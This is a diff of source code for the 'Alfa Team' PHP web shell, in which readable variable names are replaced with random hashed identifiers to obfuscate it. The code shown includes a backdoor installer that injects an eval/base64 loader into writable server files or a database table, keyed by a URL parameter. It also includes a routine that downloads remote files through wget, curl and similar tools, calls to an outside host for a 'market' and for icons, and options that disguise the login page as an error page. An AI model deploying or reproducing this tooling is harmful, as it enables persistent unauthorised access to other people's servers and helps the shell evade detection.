+echo('<li><a id="menu_opt_'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'\';g(\''.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$rkptsoeg2063c1608d6e0baf80249c42e2be5804.'</a></li>'."\n");
 }
 echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">Alfa Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="alfa_plus">Alfa market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['AlfaUser']) && !empty($_COOKIE['AlfaPass']) ? '<a href="javascript:void(0);" onclick="alfaLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="alfaFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
 @error_reporting(E_ALL ^ E_NOTICE);
@@ -1230,38 +1304,38 @@ function alfalogout(){
 unset($_COOKIE['AlfaUser'],$_COOKIE['AlfaPass']);
 echo("ok");
 }
-function showAnimation($name){
-	return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
+function showAnimation($kkkpgnftb068931cc450442b63f5b3d276ea4297){
+	return '-webkit-animation: '.$kkkpgnftb068931cc450442b63f5b3d276ea4297.' 800ms ease-in-out forwards;-moz-animation: '.$kkkpgnftb068931cc450442b63f5b3d276ea4297.' 800ms ease-in-out forwards;-ms-animation: '.$kkkpgnftb068931cc450442b63f5b3d276ea4297.' 800ms ease-in-out forwards;animation: '.$kkkpgnftb068931cc450442b63f5b3d276ea4297.' 800ms ease-in-out forwards;';
 }
-function __showicon($r){
-	$s['btn']='http://solevisible.com/images/btn.png';
-	$s['alfamini']='http://solevisible.com/images/alfamini.png';
-	$s['loader']='http://solevisible.com/images/loader.svg';
+function __showicon($yxarqqmp4b43b0aee35624cd95b910189b3dc231){
+	$fwekvgvg03c7c0ace395d80182db07ae2c30f034['btn']='http://solevisible.com/images/btn.png';
+	$fwekvgvg03c7c0ace395d80182db07ae2c30f034['alfamini']='http://solevisible.com/images/alfamini.png';
+	$fwekvgvg03c7c0ace395d80182db07ae2c30f034['loader']='http://solevisible.com/images/loader.svg';
 	//return 'data:image/png;base64,'.__get_resource($s[$r]);
-	return $s[$r];
+	return $fwekvgvg03c7c0ace395d80182db07ae2c30f034[$yxarqqmp4b43b0aee35624cd95b910189b3dc231];
 }
 function alfainbackdoor(){
 alfahead();
 echo '<div class=header><center><p><div class="txtfont_header">| Install BackDoor |</div></p><h3><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'file\')">| In File | </a><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'db\')">| In DataBase | </a></h3></center>';
-$error = '<font color="red">Error In Inject BackDoor...!<br>File Loader is not Writable Or Not Exists...!</font>';
-$success= '<font color="green">Success...!';
-$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Alfa Team is Here...!');\n?></textarea></p></div>";
-$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Alfa Team Uploader</option><option value='my'>My Private Shell</option></select>";
-$cwd = 'Example: /home/alfa/public_html/index.php';
+$kowlomtecb5e100e5a9a3e7f6d1fd97512215282 = '<font color="red">Error In Inject BackDoor...!<br>File Loader is not Writable Or Not Exists...!</font>';
+$fdcvmlyc260ca9dd8a4577fc00b7bd5810298076= '<font color="green">Success...!';
+$paevkqwq6394d816bfb4220289a6f4b29cfb1834 = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Alfa Team is Here...!');\n?></textarea></p></div>";
+$zhyqizus99938282f04071859941e18f16efcf42 = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Alfa Team Uploader</option><option value='my'>My Private Shell</option></select>";
+$lpndcjtf109633366fd0d46d371ede589998abaa = 'Example: /home/alfa/public_html/index.php';
 if($_POST['alfa1']=='file'){
-echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='alfa'> <input type='submit' value=' '>{$textarea}</form></p></center>");
+echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$zhyqizus99938282f04071859941e18f16efcf42} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$lpndcjtf109633366fd0d46d371ede589998abaa}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='alfa'> <input type='submit' value=' '>{$paevkqwq6394d816bfb4220289a6f4b29cfb1834}</form></p></center>");
 if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa4']!=''){
-$method = $_POST['alfa2'];
-$file = $_POST['alfa3'];
-$shell = $_POST['alfa4'];
-$key = str_replace(array('"','\''),'',trim($_POST['alfa5']));
-if($key=='')$key='alfa';
-if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__ALFA_SHELL_CODE'];}
-$code = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
-if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?alfa=".$key.'</font>');}else{__alert($error);}}}
+$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa2'];
+$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $_POST['alfa3'];
+$iyzktunq2591c98b70119fe624898b1e424b5e91 = $_POST['alfa4'];
+$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = str_replace(array('"','\''),'',trim($_POST['alfa5']));
+if($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=='')$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d='alfa';
+if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce=='my'){$iyzktunq2591c98b70119fe624898b1e424b5e91=__ZW5jb2Rlcg($iyzktunq2591c98b70119fe624898b1e424b5e91);}else{$iyzktunq2591c98b70119fe624898b1e424b5e91=$GLOBALS['__ALFA_SHELL_CODE'];}
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$iyzktunq2591c98b70119fe624898b1e424b5e91.'");exit;}?>';
+if(@is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)&&@is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){@file_put_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$nndigmblc13367945d5d4c91047b3b50234aa7ab."\n".@file_get_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac));__alert($fdcvmlyc260ca9dd8a4577fc00b7bd5810298076."<br>Run With: ".basename($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."?alfa=".$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'</font>');}else{__alert($kowlomtecb5e100e5a9a3e7f6d1fd97512215282);}}}
 if($_POST['alfa1']=='db'){
 echo("<center><p><div class='txtfont_header'>| In DataBase |</div></p>".getConfigHtml('all')."<p><form onsubmit=\"g('inbackdoor',null,'db',this.db_host.value,this.db_username.value,this.db_password.value,this.db_name.value,this.file.value,this.method.value,this.shell.value,this.key.value);return false;\">");
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
@@ -1270,46 +1344,46 @@ array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_pass
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
-array('color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $cwd, 'inputSize' => '50', 'placeholder' => true),
+array('color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $lpndcjtf109633366fd0d46d371ede589998abaa, 'inputSize' => '50', 'placeholder' => true),
 'td6' =>
 array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'alfa', 'inputSize' => '50')
 );
-create_table($table);
-echo("<p>{$select}</p>");
-echo($textarea);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
+echo("<p>{$zhyqizus99938282f04071859941e18f16efcf42}</p>");
+echo($paevkqwq6394d816bfb4220289a6f4b29cfb1834);
 echo("<p><input type='submit' value=' '></p></form></p></center>");
 if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa5']!=''&&$_POST['alfa6']!=''){
-$dbhost = $_POST['alfa2'];
-$dbuser = $_POST['alfa3'];
-$dbpw = $_POST['alfa4'];
-$dbname = $_POST['alfa5'];
-$file = $_POST['alfa6'];
-$method = $_POST['alfa7'];
-$shell = $_POST['alfa8'];
-$key = str_replace(array('"','\''),'',trim($_POST['alfa9']));
-if($key=='')$key='alfa';
-if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__ALFA_SHELL_CODE'];}
-if($conn = mysqli_connect($dbhost,$dbuser,$dbpw,$dbname)){
-$code = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM alfa_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
-if(@is_file($file)&&@is_writable($file)){
-@mysqli_query($conn,'DROP TABLE `alfa_bc`');
-@mysqli_query($conn,'CREATE TABLE `alfa_bc` (code LONGTEXT)');
-@mysqli_query($conn,'INSERT INTO `alfa_bc` VALUES("'.$shell.'")');
-@file_put_contents($file,$code."\n".@file_get_contents($file));
-__alert($success."<br>Run With: ".basename($file)."?alfa=".$key.'</font>');}else{__alert($error);}}}}
+$coaoaskb8642fb61d2df2aba1f8c7f6bc918507e = $_POST['alfa2'];
+$xeuplhus6402673de752e4271e326e0f2029848a = $_POST['alfa3'];
+$nksmaoey5fd78de05123971c7fe530d759277c3c = $_POST['alfa4'];
+$pghnyjea4cd4a49f25984e26fe708c1fbd896653 = $_POST['alfa5'];
+$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $_POST['alfa6'];
+$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa7'];
+$iyzktunq2591c98b70119fe624898b1e424b5e91 = $_POST['alfa8'];
+$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = str_replace(array('"','\''),'',trim($_POST['alfa9']));
+if($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=='')$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d='alfa';
+if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce=='my'){$iyzktunq2591c98b70119fe624898b1e424b5e91=__ZW5jb2Rlcg($iyzktunq2591c98b70119fe624898b1e424b5e91);}else{$iyzktunq2591c98b70119fe624898b1e424b5e91=$GLOBALS['__ALFA_SHELL_CODE'];}
+if($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898 = mysqli_connect($coaoaskb8642fb61d2df2aba1f8c7f6bc918507e,$xeuplhus6402673de752e4271e326e0f2029848a,$nksmaoey5fd78de05123971c7fe530d759277c3c,$pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'"){$conn=mysqli_connect("'.str_replace('"','\"',$coaoaskb8642fb61d2df2aba1f8c7f6bc918507e).'","'.str_replace('"','\"',$xeuplhus6402673de752e4271e326e0f2029848a).'","'.str_replace('"','\"',$nksmaoey5fd78de05123971c7fe530d759277c3c).'","'.str_replace('"','\"',$pghnyjea4cd4a49f25984e26fe708c1fbd896653).'");$q=mysqli_query($conn,"SELECT `code` FROM alfa_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
+if(@is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)&&@is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){
+@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,'DROP TABLE `alfa_bc`');
+@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,'CREATE TABLE `alfa_bc` (code LONGTEXT)');
+@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,'INSERT INTO `alfa_bc` VALUES("'.$iyzktunq2591c98b70119fe624898b1e424b5e91.'")');
+@file_put_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$nndigmblc13367945d5d4c91047b3b50234aa7ab."\n".@file_get_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac));
+__alert($fdcvmlyc260ca9dd8a4577fc00b7bd5810298076."<br>Run With: ".basename($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."?alfa=".$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'</font>');}else{__alert($kowlomtecb5e100e5a9a3e7f6d1fd97512215282);}}}}
 echo('</div>');
 alfafooter();
 }
 function alfawhois(){
 echo("<div class='header'><center><p><div class='txtfont_header'>| Whois |</div></p><p><form onsubmit=\"g('whois',null,this.url.value,'>>');return false;\"><div class='txtfont'>Url: </div> <input type='text' name='url' style='text-align:center;' size='50' placeholder='google.com'> <input type='submit' value=' '></form></p></center>");
 if($_POST['alfa2']=='>>'&&!empty($_POST['alfa1'])){
-$site = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['alfa1']);
-$target = 'http://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$site;
-$data = @file_get_contents($target);
-if($data==''){$get = new AlfaCURL();$get->ssl = true;$data = $get->Send($target);}
-$target = @json_decode($data,true);
+$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['alfa1']);
+$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = 'http://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$svjurwzc98defd6ee70dfb1dea416cecdf391f58;
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = @file_get_contents($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
+if($sfmsaibm8d777f385d3dfec8815d20f7496026dc==''){$oirhhzwgb5eda0a74558a342cf659187f06f746f = new AlfaCURL();$oirhhzwgb5eda0a74558a342cf659187f06f746f->$dojqcedr54a2bf8c09ace67d3513aaa1aa7aa0f3 = true;$sfmsaibm8d777f385d3dfec8815d20f7496026dc = $oirhhzwgb5eda0a74558a342cf659187f06f746f->Send($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);}
+$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = @json_decode($sfmsaibm8d777f385d3dfec8815d20f7496026dc,true);
 echo __pre();
-if(is_array($target)){echo($target["whois_raw"]);}else{echo alfaEx("whois ".$site);}}
+if(is_array($nyvfphvm42aefbae01d2dfd981f7da7d823d689e)){echo($nyvfphvm42aefbae01d2dfd981f7da7d823d689e["whois_raw"]);}else{echo alfaEx("whois ".$svjurwzc98defd6ee70dfb1dea416cecdf391f58);}}
 echo("</div>");
 }
 function alfaremotedl(){
@@ -1321,10 +1395,10 @@ echo("<div class='header'><center><p><div class='txtfont_header'>| Upload From U
 </form></p></center>");
 if(isset($_POST['alfa1'],$_POST['alfa2'],$_POST['alfa3'])&&!empty($_POST['alfa1'])&&$_POST['alfa3']=='>>'){
 echo __pre();
-$url = $_POST['alfa1'];
-$path = $_POST['alfa2'];
+$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $_POST['alfa1'];
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['alfa2'];
 echo('<center>');
-if(__download($url,$path)){
+if(__download($fefubzei572d4e421e5e6b9bc11d815e8a027112,$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)){
 echo('<font color="green">Success...!</font>');
 }else{
 echo('<font color="red">Error...!</font>');
@@ -1334,60 +1408,60 @@ echo('</center>');
 echo("</div>");
 alfafooter();
 }
-function __download($url,$path=false){
-if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
-$saveas = basename(rawurldecode($url));
-if($path){$saveas=$path.$saveas;}
-if($content = __read_file($url)){
-if(@is_file($saveas))@unlink($saveas);
-if(__write_file($saveas, $content)){return true;}}
-$buff = alfaEx("wget ".$url." -O ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("curl ".$url." -o ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("lwp-download ".$url." ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("lynx -source ".$url." > ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("GET ".$url." > ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("links -source ".$url." > ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("fetch -o ".$saveas." -p ".$url);
-if(@is_file($saveas)) return true;
+function __download($fefubzei572d4e421e5e6b9bc11d815e8a027112,$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485=false){
+if(!preg_match("/[a-z]+:\/\/.+/",$fefubzei572d4e421e5e6b9bc11d815e8a027112)) return false;
+$clckqbwa3dec39dcd8987ae5b08ca11659f5392c = basename(rawurldecode($fefubzei572d4e421e5e6b9bc11d815e8a027112));
+if($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485){$clckqbwa3dec39dcd8987ae5b08ca11659f5392c=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$clckqbwa3dec39dcd8987ae5b08ca11659f5392c;}
+if($mveevork9a0364b9e99bb480dd25e1f0284c8555 = __read_file($fefubzei572d4e421e5e6b9bc11d815e8a027112)){
+if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c))@unlink($clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
+if(__write_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c, $mveevork9a0364b9e99bb480dd25e1f0284c8555)){return true;}}
+$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("wget ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." -O ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
+if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
+$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("curl ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." -o ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
+if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
+$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("lwp-download ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
+if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
+$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("lynx -source ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." > ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
+if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
+$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("GET ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." > ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
+if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
+$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("links -source ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." > ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
+if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
+$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("fetch -o ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c." -p ".$fefubzei572d4e421e5e6b9bc11d815e8a027112);
+if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
 return false;
 }
-function clean_string($string){
+function clean_string($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21){
   if(function_exists("iconv")){
-	  $s = trim($string);
-	  $s = iconv("UTF-8", "UTF-8//IGNORE", $s);
+	  $fwekvgvg03c7c0ace395d80182db07ae2c30f034 = trim($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
+	  $fwekvgvg03c7c0ace395d80182db07ae2c30f034 = iconv("UTF-8", "UTF-8//IGNORE", $fwekvgvg03c7c0ace395d80182db07ae2c30f034);
   }
-  return $s;
+  return $fwekvgvg03c7c0ace395d80182db07ae2c30f034;
 }
-function __read_file($file, $boom = true){
-$content = false;
-if($fh = @fopen($file, "rb")){
-$content = "";
-while(!feof($fh)){
-$content .= $boom ? clean_string(fread($fh, 8192)) : fread($fh, 8192);
+function __read_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $ofeeocdo65079b006e85a7e798abecb99e47c154 = true){
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 = false;
+if($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62 = @fopen($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, "rb")){
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 = "";
+while(!feof($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62)){
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= $ofeeocdo65079b006e85a7e798abecb99e47c154 ? clean_string(fread($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62, 8192)) : fread($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62, 8192);
 }
-@fclose($fh);
+@fclose($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62);
 }
-if(empty($content)||!$content){
-	$content = alfaEx("cat '".addslashes($file)."'");
+if(empty($mveevork9a0364b9e99bb480dd25e1f0284c8555)||!$mveevork9a0364b9e99bb480dd25e1f0284c8555){
+	$mveevork9a0364b9e99bb480dd25e1f0284c8555 = alfaEx("cat '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."'");
 }
-return $content;
+return $mveevork9a0364b9e99bb480dd25e1f0284c8555;
 }
 function alfaMarket(){
 echo "<div class='header'>";
-$curl = new AlfaCURL();
-$content = $curl->Send("http://solevisible.com/market.php");
-$data = @json_decode($content, true);
-if(!empty($data)){
-if($data["status"] == "open"){
-	echo $data["content"];
+$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = new AlfaCURL();
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send("http://solevisible.com/market.php");
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = @json_decode($mveevork9a0364b9e99bb480dd25e1f0284c8555, true);
+if(!empty($sfmsaibm8d777f385d3dfec8815d20f7496026dc)){
+if($sfmsaibm8d777f385d3dfec8815d20f7496026dc["status"] == "open"){
+	echo $sfmsaibm8d777f385d3dfec8815d20f7496026dc["content"];
 }else{
-	echo $data["error_msg"];
+	echo $sfmsaibm8d777f385d3dfec8815d20f7496026dc["error_msg"];
 }
 }else{
 	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the alfa market....! try later.</div>";
@@ -1400,78 +1474,78 @@ AlfaNum(6,7,8,9,10);
 echo '<div class=header><center><p><div class="txtfont_header">| Settings |</div></p><h3><a href=javascript:void(0) onclick="g(\'settings\',null,null,null,null,null,null,null,null,\'main\')">| Generall Setting | </a></h3></center>';
 if($_POST["alfa8"] == "main"){
 echo '<p><center><div class="txtfont_header">| Settings |</div></p><form onSubmit="reloadSetting(this);return false;" method=\'post\'>';
-$lg_array = array('0'=>'No','1'=>'Yes');
-$penc_array = array('false'=>'No','true'=>'Yes');
-$protect_html = "";
-$icon_html = "";
-$postEnc_html = "";
-$login_html = "";
-$cgiapi_html = "";
-foreach($lg_array as $key=>$val)$protect_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['safemode']=='1'?'selected':'').'>'.$val.'</option>';
-foreach($lg_array as $key=>$val)$icon_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['show_icons']=='1'?'selected':'').'>'.$val.'</option>';
-foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa9'])&&$_POST['alfa9']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['alfa9'])?'selected':'')).'>'.$val.'</option>';
-foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa7'])&&$_POST['alfa7']==$key?"selected":(__ALFA_POST_ENCRYPTION__&&empty($_POST['alfa7'])?'selected':'')).'>'.$val.'</option>';
-$lg_array = array("gui"=>"GUI","500"=>"500 Internal Server Error","403"=>"403 Forbidden","404"=>"404 NotFound");
-foreach($lg_array as $key=>$val)$login_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['login_page']==$key?'selected':'').'>'.$val.'</option>';
+$yesqidvyf0d722d106665c8f1db553d507140848 = array('0'=>'No','1'=>'Yes');
+$gkzajztu7904b9622e24a4786d4f34a348e88997 = array('false'=>'No','true'=>'Yes');
+$lbsfntjsb65581e7ecc28dd2657cc0a374aa555c = "";
+$ttwwrvsa111778af60cb1093cf33144d64cd3f29 = "";
+$zfynbafa89916c6dc3576acb72931b354faf1ccd = "";
+$ezsffanbe4ac821fee9d2c94c01acda0244a254f = "";
+$cjnewkuz92666816abf61a64c2aa2a5c00286c55 = "";
+foreach($yesqidvyf0d722d106665c8f1db553d507140848 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$lbsfntjsb65581e7ecc28dd2657cc0a374aa555c .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.($GLOBALS['DB_NAME']['safemode']=='1'?'selected':'').'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
